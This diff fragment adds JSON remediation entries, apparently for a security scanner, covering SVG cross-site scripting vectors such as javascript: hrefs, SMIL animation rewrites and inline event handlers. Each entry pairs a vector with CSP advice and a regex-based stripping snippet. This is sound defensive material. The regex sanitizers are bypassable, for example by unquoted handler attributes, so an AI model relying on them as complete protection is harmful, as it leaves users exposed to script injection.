+      "detail": "<foreignObject> with a javascript: URI in its HTML children (e.g. <a href=\"javascript:...\">) executes JavaScript on click.  Validate URL schemes inside <foreignObject> content or remove <foreignObject> entirely.",
+      "code_example": "# Strip <a> elements with javascript: href inside <foreignObject>\nimport re\nsafe = re.sub(r'<a[^>]*href\\s*=\\s*[\"\\']javascript:[^>]*>[\\s\\S]*?</a>',\n              '', svg, flags=re.I | re.DOTALL)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Apply CSP default-src 'self' to block javascript: URIs in SVG."
+      ]
+    },
+    "svg_xss_svg_use_data": {
+      "headline": "Block data: URIs on <use href>.",
+      "detail": "<use href=\"data:...\"> can load arbitrary content (including SVG with embedded script).  Validate that all href attributes on <use> elements use only http(s): or relative URLs.",
+      "code_example": "# Strip <use> with data: href\nimport re\nsafe = re.sub(r'<use[^>]*href\\s*=\\s*[\"\\']data:[^>]*/?>',\n              '', svg, flags=re.I)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Apply CSP default-src 'self' to block data: URIs in SVG."
+      ]
+    },
+    "svg_xss_svg_set_href_jsuri": {
+      "headline": "Block SMIL <set> from rewriting href to javascript:.",
+      "detail": "SMIL <set> can rewrite the href attribute of an <a> element to javascript: at runtime, bypassing static sanitization.  Remove <set> elements from user-supplied SVG.",
+      "code_example": "# Strip <set> elements from SVG\nimport re\nsafe = re.sub(r'<set[\\s\\S]*?/(?:set)?>', '', svg, flags=re.I)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block SMIL elements entirely in user-supplied SVG."
+      ]
+    },
+    "svg_xss_svg_animate_href_jsuri": {
+      "headline": "Block SMIL <animate> from rewriting href to javascript:.",
+      "detail": "SMIL <animate> can rewrite the href attribute to javascript: at runtime.  Remove <animate> elements from user-supplied SVG.",
+      "code_example": "# Strip <animate> elements from SVG\nimport re\nsafe = re.sub(r'<animate[\\s\\S]*?/(?:animate)?>', '', svg, flags=re.I)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block SMIL elements entirely in user-supplied SVG."
+      ]
+    },
+    "svg_xss_svg_animatetransform_event": {
+      "headline": "Block SMIL <animateTransform> from writing to event handlers.",
+      "detail": "Same vector as <set>/<animate>, but using <animateTransform>. Remove <animateTransform> elements from user-supplied SVG.",
+      "code_example": "# Strip <animateTransform> elements from SVG\nimport re\nsafe = re.sub(r'<animateTransform[\\s\\S]*?/(?:animateTransform)?>', '', svg,\n              flags=re.I)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block SMIL elements entirely in user-supplied SVG."
+      ]
+    },
+    "svg_xss_svg_animatemotion_event": {
+      "headline": "Strip event handlers from <animateMotion>.",
+      "detail": "<animateMotion> with an inline onbegin handler executes JavaScript when the animation starts.  Strip all on* attributes from <animateMotion>, or remove the element entirely.",
+      "code_example": "# Strip <animateMotion> entirely (recommended)\nimport re\nsafe = re.sub(r'<animateMotion[\\s\\S]*?/(?:animateMotion)?>', '', svg,\n              flags=re.I)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block SMIL elements entirely in user-supplied SVG."
+      ]
+    },
+    "svg_xss_svg_smil_onend": {
+      "headline": "Strip onend handlers from SMIL elements.",
+      "detail": "SMIL onend fires when the animation ends.  Strip all on* event handler attributes from SMIL elements.",
+      "code_example": "# Strip on* attributes from SMIL elements\nimport re\nsmil_re = re.compile(r'<(set|animate|animateTransform|animateMotion)([^>]*)>', re.I)\ndef strip_handlers(m):\n    tag, attrs = m.group(1), m.group(2)\n    attrs = re.sub(r'\\s+on\\w+\\s*=\\s*[\"\\'][^\"\\']*[\"\\']', '', attrs, flags=re.I)\n    return f'<{tag}{attrs}>'\nsafe = smil_re.sub(strip_handlers, svg)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block SMIL elements entirely in user-supplied SVG."
+      ]
+    },
+    "svg_xss_svg_smil_onrepeat": {
+      "headline": "Strip onrepeat handlers from SMIL elements.",
+      "detail": "SMIL onrepeat fires when the animation repeats.  Strip all on* event handler attributes from SMIL elements.",
+      "code_example": "# Strip on* attributes from SMIL elements\nimport re\nsmil_re = re.compile(r'<(set|animate|animateTransform|animateMotion)([^>]*)>', re.I)\ndef strip_handlers(m):\n    tag, attrs = m.group(1), m.group(2)\n    attrs = re.sub(r'\\s+on\\w+\\s*=\\s*[\"\\'][^\"\\']*[\"\\']', '', attrs, flags=re.I)\n    return f'<{tag}{attrs}>'\nsafe = smil_re.sub(strip_handlers, svg)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block SMIL elements entirely in user-supplied SVG."
+      ]
+    },
+    "svg_xss_svg_a_data": {
+      "headline": "Block data:text/html on SVG <a href>.",
+      "detail": "<a href=\"data:text/html,...\"> inside SVG can load arbitrary HTML on click.  Validate that all href attributes on <a> elements use only http(s): or relative URLs.",
+      "code_example": "# Strip <a> with data:text/html href\nimport re\nsafe = re.sub(r'<a[^>]*href\\s*=\\s*[\"\\']data:text/html[^>]*>[\\s\\S]*?</a>',\n              '', svg, flags=re.I | re.DOTALL)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Apply CSP default-src 'self' to block data: URIs."
+      ]
+    },
+    "svg_xss_svg_image_data": {
+      "headline": "Block data: URIs on <image href>.",
+      "detail": "<image href=\"data:...\"> inside SVG can load arbitrary content.  Validate that all href attributes on <image> elements use only http(s): or relative URLs.",
+      "code_example": "# Strip <image> with data: href\nimport re\nsafe = re.sub(r'<image[^>]*href\\s*=\\s*[\"\\']data:[^>]*/?>',\n              '', svg, flags=re.I)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Apply CSP img-src 'self' to block data: URIs in SVG."
+      ]
+    },
+    "svg_xss_svg_listener": {
+      "headline": "Strip <listener> elements from SVG input.",
+      "detail": "<listener> (SVG 1.2) is similar to addEventListener in XML form.  Remove <listener> elements from user-supplied SVG.",
+      "code_example": "# Strip <listener> elements\nimport re\nsafe = re.sub(r'<listener[\\s\\S]*?/(?:listener)?>', '', svg,\n              flags=re.I)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block <listener> in your sanitizer's allow-list."
+      ]
+    },
+    "svg_xss_svg_discard": {
+      "headline": "Audit <discard> usage in SVG input.",
+      "detail": "<discard> (SVG 2) removes a target element at a specified time.  Its presence is a signal to audit for event triggering.  Consider removing <discard> from user-supplied SVG.",
+      "code_example": "# Strip <discard> elements\nimport re\nsafe = re.sub(r'<discard[^>]*/?>', '', svg, flags=re.I)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block <discard> in your sanitizer's allow-list."
+      ]
+    },
+    "svg_xss_svg_onclick": {
+      "headline": "Strip onclick handlers from SVG elements.",
+      "detail": "SVG elements with inline onclick handlers execute JavaScript on click.  Strip all on* event handler attributes from SVG elements.",
+      "code_example": "# Strip on* attributes from all SVG elements\nimport re\nsafe = re.sub(r'\\s+on\\w+\\s*=\\s*[\"\\'][^\"\\']*[\"\\']', '', svg,\n              flags=re.I)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Apply CSP script-src 'self' (no 'unsafe-inline') to block inline event handlers."
+      ]
+    },
+    "svg_xss_svg_event_handler": {
+      "headline": "Strip inline event handlers from SVG elements.",
+      "detail": "SVG elements with inline on* event handlers execute JavaScript.  Strip all on* event handler attributes from SVG elements.",
+      "code_example": "# Strip on* attributes from all SVG elements\nimport re\nsafe = re.sub(r'\\s+on\\w+\\s*=\\s*[\"\\'][^\"\\']*[\"\\']', '', svg,\n              flags=re.I)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Apply CSP script-src 'self' (no 'unsafe-inline') to block inline event handlers."
+      ]
+    },
+    "svg_xss_svg_style_mozbinding": {
+      "headline": "Strip -moz-binding from SVG <style>.",
+      "detail": "SVG <style> with -moz-binding:url(...) is a legacy Firefox XSS vector.  Strip -moz-binding from any <style> content inside SVG, or remove <style> entirely.",
+      "code_example": "# Strip <style> from SVG entirely (recommended)\nimport re\nsafe = re.sub(r'<style[\\s\\S]*?</style>', '', svg,\n              flags=re.I | re.DOTALL)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block <style> in user-supplied SVG entirely."
+      ]
+    },
+    "svg_xss_svg_style_behavior": {
+      "headline": "Strip behavior:url() from SVG <style>.",
+      "detail": "SVG <style> with behavior:url(.htc) is a legacy IE HTC XSS vector.  Strip behavior:url() from any <style> content inside SVG, or remove <style> entirely.",
+      "code_example": "# Strip <style> from SVG entirely (recommended)\nimport re\nsafe = re.sub(r'<style[\\s\\S]*?</style>', '', svg,\n              flags=re.I | re.DOTALL)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block <style> in user-supplied SVG entirely."
+      ]
+    },
+    "svg_xss_svg_tref_jsuri": {
+      "headline": "Block javascript: URIs on <tref href>.",
+      "detail": "<tref href=\"javascript:...\"> is a known but rare SVG XSS vector.  Validate that all href attributes on <tref> elements use only http(s): or relative URLs.",
+      "code_example": "# Strip <tref> with javascript: href\nimport re\nsafe = re.sub(r'<tref[^>]*href\\s*=\\s*[\"\\']javascript:[^>]*/?>',\n              '', svg, flags=re.I)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block <tref> in your sanitizer's allow-list (it's deprecated in SVG 2)."
+      ]
+    },
+    "svg_xss_svg_altglyph_jsuri": {
+      "headline": "Block javascript: URIs on <altGlyph href>.",
+      "detail": "<altGlyph href=\"javascript:...\"> is a known SVG XSS vector.  Validate that all href attributes on <altGlyph> elements use only http(s): or relative URLs.",
+      "code_example": "# Strip <altGlyph> with javascript: href\nimport re\nsafe = re.sub(r'<altGlyph[^>]*href\\s*=\\s*[\"\\']javascript:[^>]*/?>',\n              '', svg, flags=re.I)",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block <altGlyph> in your sanitizer's allow-list."
+      ]
+    }
+  }
+}
